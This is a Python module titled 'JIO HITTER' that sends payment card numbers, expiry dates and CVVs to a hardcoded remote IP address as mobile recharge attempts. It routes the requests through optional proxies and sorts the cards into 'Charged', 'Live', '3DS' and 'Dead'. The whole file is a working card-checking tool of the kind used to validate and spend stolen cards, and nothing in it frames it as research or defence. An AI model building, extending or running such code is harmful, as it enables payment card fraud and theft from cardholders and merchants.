"""
JIO HITTER — API module with proxy support
FINAL — displayMessage priority
"""
import json
import time
import logging
import aiohttp
import re

JIO_API_URL = "http://5.83.136.94:8080/recharge"
JIO_TIMEOUT = 180

VALID_AMOUNTS = {
    19, 29, 49, 69, 98,
    129, 155, 199, 219, 239,
    299, 349, 399, 449, 499,
    599, 719, 839, 999, 1499,
}

_shared_session = None


def _get_session():
    global _shared_session
    if _shared_session is None or _shared_session.closed:
        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)
        _shared_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=JIO_TIMEOUT),
        )
    return _shared_session


async def close_session():
    global _shared_session
    if _shared_session and not _shared_session.closed:
        await _shared_session.close()
        _shared_session = None


def is_valid_amount(amount):
    try:
        return int(amount) in VALID_AMOUNTS
    except Exception:
        return False


def parse_card(line):
    parts = re.split(r"[|,;:\s]+", line.strip())
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = parts
    if not (cc.isdigit() and len(cc) >= 12):
        return None
    if not (mm.isdigit() and yy.isdigit() and cvv.isdigit()):
        return None
    if len(yy) == 4:
        yy = yy[2:]
    return f"{cc}|{mm.zfill(2)}|{yy}|{cvv}"


def _proxy_to_url(proxy):
    if not proxy:
        return None
    p = proxy.strip()
    if '://' in p:
        return p
    parts = p.split(':')
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


async def check_jio(number, amount, card, proxy=None):
    body = {
        "number": str(number),
        "amount": str(amount),
        "card": card,
    }
    session = _get_session()
    t0 = time.time()

    kwargs = {"json": body}
    proxy_url = _proxy_to_url(proxy) if proxy else None
    if proxy_url:
        kwargs["proxy"] = proxy_url

    try:
        async with session.post(JIO_API_URL, **kwargs) as r:
            text = await r.text()
            elapsed = time.time() - t0
            return _parse_response(r.status, text, elapsed)
    except aiohttp.ClientError as e:
        return {"status": "Error", "message": f"Network error: {type(e).__name__}",
                "raw": str(e)[:300], "http_code": None, "elapsed": time.time() - t0}
    except Exception as e:
        logging.warning(f"[jio] API exception: {type(e).__name__}: {e}")
        return {"status": "Error", "message": f"{type(e).__name__}: {str(e)[:80]}",
                "raw": str(e)[:300], "http_code": None, "elapsed": time.time() - t0}


def _parse_response(http_code, text, elapsed):
    result = {"status": "Unknown", "message": "", "raw": text[:500],
              "http_code": http_code, "elapsed": elapsed}

    data = None
    try:
        data = json.loads(text)
    except Exception:
        if http_code == 200:
            result["status"] = "Dead"
            result["message"] = text[:150]
        elif http_code == 404:
            result["status"] = "Error"
            result["message"] = "API endpoint not found"
        elif http_code == 402:
            result["status"] = "Error"
            result["message"] = "API quota exceeded"
        elif http_code == 429:
            result["status"] = "Error"
            result["message"] = "API rate limited"
        elif http_code == 500:
            result["status"] = "Error"
            result["message"] = "API server error"
        elif http_code == 502:
            result["status"] = "Error"
            result["message"] = "API gateway error"
        elif http_code == 503:
            result["status"] = "Error"
            result["message"] = "API service unavailable"
        elif http_code == 504:
            result["status"] = "Error"
            result["message"] = "API gateway timeout"
        else:
            result["status"] = "Error"
            result["message"] = f"API error (HTTP {http_code})"
        return result

    api_status = str(data.get("status", "")).upper().strip()

    errors = data.get("errors") or {}
    if isinstance(errors, dict):
        display_msg = errors.get("displayMessage") or ""
    else:
        display_msg = ""

    if not display_msg:
        display_msg = data.get("message") or "No response"

    result["message"] = str(display_msg)[:250]

    if api_status in ("CHARGED", "SUCCESS", "APPROVED", "CAPTURED", "PAID"):
        result["status"] = "Charged"
        return result

    if api_status in ("INSUFFICIENT_FUNDS", "LOW_BALANCE", "NOT_ENOUGH_FUNDS"):
        result["status"] = "Live"
        return result

    if api_status in ("3DS_REQUIRED", "OTP_REQUIRED", "AUTHENTICATION_REQUIRED", "CHALLENGE_REQUIRED"):
        result["status"] = "3DS"
        return result

    if api_status in ("ISSUER_DECLINE", "DECLINED", "CARD_DECLINED", "DO_NOT_HONOR",
                      "PAYMENT_FAILED", "GENERAL_DECLINE", "RISK_DECLINE", "FRAUD_SUSPECTED"):
        result["status"] = "Dead"
        return result

    if api_status in ("ERROR", "FAILED", "PROCESSOR_ERROR", "SYSTEM_ERROR", "TIMEOUT"):
        result["status"] = "Error"
        return result

    if api_status in ("PENDING", "PROCESSING", "IN_PROGRESS"):
        result["status"] = "Pending"
        return result

    ok = data.get("ok")
    if ok is True:
        result["status"] = "Charged"
        return result

    low = display_msg.lower()
    if "insufficient" in low or "balance" in low:
        result["status"] = "Live"
    elif "3d" in low or "otp" in low or "authentication required" in low:
        result["status"] = "3DS"
    elif "declin" in low or "blocked" in low or "rejected" in low or "high risk" in low:
        result["status"] = "Dead"
    elif "success" in low or "charged" in low or "approved" in low or "order paid" in low:
        result["status"] = "Charged"
    elif "error" in low or "failed" in low:
        result["status"] = "Error"
    else:
        result["status"] = "Dead"

    return result